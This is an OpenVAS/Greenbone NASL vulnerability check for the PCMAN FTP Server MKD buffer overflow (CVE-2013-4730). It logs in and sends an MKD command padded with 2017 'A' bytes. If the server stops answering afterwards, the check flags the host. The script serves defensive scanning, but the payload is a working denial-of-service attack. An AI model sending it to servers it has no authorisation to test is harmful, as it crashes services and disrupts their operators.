if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805050" );
	script_version( "2020-08-24T08:40:10+0000" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-02-25 12:32:52 +0530 (Wed, 25 Feb 2015)" );
	script_cve_id( "CVE-2013-4730" );
	script_name( "PCMAN FTP Server MKD Command Buffer Overflow vulnerability" );
	script_tag( name: "summary", value: "This host is running PCMAN FTP server and
  is prone to buffer overflow vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted huge request in MKD command
  and check whether the application is vulnerable." );
	script_tag( name: "insight", value: "Flaw is due to an improper sanitation of
  user supplied input passed via the 'MKD' command." );
	script_tag( name: "impact", value: "Successful exploitation will allow a remote
  attacker to cause denial of service condition resulting in loss of availability
  for the application." );
	script_tag( name: "affected", value: "PCMAN FTP version 2.0.7, Other versions may
  also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36078" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/pcmans/ftp/detected" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
ftpPort = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: ftpPort );
if(!banner || !ContainsString( banner, "220 PCMan's FTP Server" )){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
soc = open_sock_tcp( ftpPort );
if(!soc){
	exit( 0 );
}
ftplogin = ftp_log_in( socket: soc, user: user, pass: pass );
if(!ftplogin){
	ftp_close( socket: soc );
	exit( 0 );
}
PAYLOAD = crap( data: "\\x41", length: 2017 );
send( socket: soc, data: NASLString( "MKD", PAYLOAD, "\r\n" ) );
ftp_close( socket: soc );
sleep( 3 );
soc = open_sock_tcp( ftpPort );
if(!soc){
	security_message( ftpPort );
	exit( 0 );
}
ftplogin = ftp_log_in( socket: soc, user: user, pass: pass );
if(!ftplogin){
	ftp_close( socket: soc );
	security_message( ftpPort );
	exit( 0 );
}
ftp_close( socket: soc );

